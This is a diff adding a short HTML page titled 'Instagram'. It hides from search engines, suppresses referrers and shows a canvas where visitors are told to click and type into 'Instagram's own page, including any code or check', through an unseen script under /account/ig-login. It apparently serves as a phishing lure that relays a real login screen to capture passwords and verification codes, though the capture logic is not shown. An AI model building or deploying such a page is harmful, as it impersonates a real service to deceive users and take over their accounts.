@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="referrer" content="no-referrer">
+<meta name="robots" content="noindex, nofollow">
+<title>Instagram</title>
+<link rel="stylesheet" href="/auth/site.css">
+<style>
+  html, body { margin: 0; height: 100%; background: #111; color: #eee; }
+  body { display: flex; flex-direction: column; font: 15px/1.4 "Instrument Sans", sans-serif; }
+  p { margin: 0; padding: 14px 16px; }
+  canvas { flex: 1; width: 100%; background: #000; touch-action: none; }
+</style>
+</head>
+<body>
+<p id="note">Instagram's own page, including any code or check. Click the picture, then type.</p>
+<canvas id="view" width="420" height="800"></canvas>
+<script src="/supabase/config.js"></script>
+<script type="module" src="/account/ig-login/app.js"></script>
+</body>
+</html>
